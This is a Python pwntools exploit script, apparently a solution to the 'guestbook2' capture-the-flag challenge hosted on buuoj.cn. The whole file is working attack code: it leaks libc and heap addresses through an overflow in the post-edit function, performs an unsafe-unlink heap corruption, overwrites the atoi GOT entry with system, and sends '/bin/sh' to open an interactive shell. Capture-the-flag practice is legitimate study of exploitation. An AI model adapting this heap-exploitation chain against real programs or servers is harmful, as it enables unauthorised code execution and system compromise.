import sys
from pwn import *
from ctypes import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./guestbook2')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./guestbook2')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=remote('node3.buuoj.cn',25937)
			elf=ELF('./guestbook2')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]

		def add(a,c):
			io.sendlineafter('Your choice: ','2')
			io.sendlineafter('Length of new post: ',str(a))
			io.sendafter('Enter your post: ',c)

		def delete(a):
			io.sendlineafter('Your choice: ','4')
			io.sendlineafter('Post number: ',str(a))

		def edit(a,b,c):
			io.sendlineafter('Your choice: ','3')
			io.sendlineafter('Post number: ',str(a))
			io.sendlineafter('Length of post: ',str(b))
			io.sendafter('Enter your post: ',c)

		def show():
			io.sendlineafter('Your choice: ','1')
		


		add(0x91,'a'*0x91)
		add(0x80,'a'*0x80)
		add(0x80,'a'*0x80)
		add(0x80,'a'*0x80)
		add(0x80,'a'*0x80)
		add(0x80,'a'*0x80)
		add(0x80,'a'*0x80)
		delete(2)
		delete(4)
		edit(1,0x90,'a'*0x90)
		show()
		libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		libc.address=libc_base
		edit(1,0x98,'a'*0x98)
		show()
		io.recvuntil('a'*0x98)
		heap_base=(u64(io.recvuntil('\n')[:-1].ljust(8,'\x00'))&0xfffffffffffff000)-0x1000
		chunk_0=heap_base+0x30+0x18
		edit(1,0x90,p64(0)+p64(0x81)+p64(chunk_0-0x18)+p64(chunk_0-0x10)+'\x00'*0x60+p64(0x80)+p64(0x90))
		delete(2)
		edit(1,0x20,'a'*8+p64(1)+p64(8)+p64(elf.got['atoi']))
		edit(1,8,p64(libc.sym['system']))
		io.sendlineafter('Your choice: ','/bin/sh\x00')



		success('heap_base:'+hex(heap_base))
		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive('>.<_keer_>.< => ')

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue